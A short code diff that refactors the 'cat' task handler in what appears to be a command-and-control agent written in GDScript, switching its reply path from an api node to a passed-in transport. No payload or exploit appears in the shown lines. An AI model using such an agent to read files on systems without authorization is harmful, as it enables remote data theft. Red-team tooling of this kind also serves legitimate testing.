@@ -1,11 +1,6 @@
 extends Node
 
-var api
-
-func _ready():
-	api = $".".get_parent().get_node("api")
-
-func _on_tasking_cat(task):
+func _on_tasking_cat(transport, task):
 
 	if task.has("command") and task.get("command") == "cat" and task.has("parameters"):
 		# TODO: spawn a thread?
@@ -43,8 +38,8 @@ func _on_tasking_cat(task):
 			else:
 				completed = true
 
-			api.send_agent_response(
-				api.create_task_response(
+			transport.send(
+				transport.create_task_response(
 					true,
 					completed,
 					task.get("id"),
